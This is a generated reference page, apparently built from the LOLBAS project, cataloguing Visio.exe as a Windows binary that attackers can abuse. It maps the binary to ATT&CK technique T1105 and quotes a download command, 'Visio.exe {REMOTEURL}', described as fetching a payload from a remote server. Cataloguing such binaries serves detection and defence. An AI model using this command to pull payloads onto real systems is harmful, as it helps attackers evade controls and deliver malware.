---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Visio.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `visio.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Visio.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Microsoft Visio Executable

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/visio.md)
- Source verification: [source record](../../sources/lolbas/visio.exe.md)

## Aliases

- `Visio.exe`
- `visio.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: Visio.exe {REMOTEURL} |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/visio.exe.md)

## Source Verification

[source record](../../sources/lolbas/visio.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@AvihayEldad'
Person: Avihay Eldad
Author: Avihay Eldad
Commands:
- Category: Download
Command: Visio.exe {REMOTEURL}
Description: Downloads payload from remote server
```
